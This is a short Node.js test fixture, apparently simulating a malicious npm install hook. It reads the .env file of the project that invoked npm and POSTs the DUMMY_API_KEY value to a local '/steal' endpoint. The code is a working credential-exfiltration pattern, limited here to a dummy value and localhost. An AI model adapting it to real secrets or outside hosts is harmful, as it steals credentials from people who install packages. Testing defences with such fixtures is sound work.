// This fixture sends only the designated dummy value to the local listener.
const fs = require('node:fs');
const path = require('node:path');

// INIT_CWD points to the project that invoked npm, not this package's folder.
const envFile = path.join(process.env.INIT_CWD || process.cwd(), '.env');
const match = fs.readFileSync(envFile, 'utf8').match(/^DUMMY_API_KEY=(.*)$/m);
if (!match) {
  throw new Error('DUMMY_API_KEY missing from test .env');
}

// Send the dummy value to the listener on this machine and fail if it rejects it.
fetch('http://127.0.0.1:4001/steal', {
  method: 'POST',
  body: match[1].trim(),
})
  .then(response => {
    if (!response.ok) {
      throw new Error(`Listener returned ${response.status}`);
    }
  })
  .catch(error => {
    console.error(error);
    process.exitCode = 1;
  });
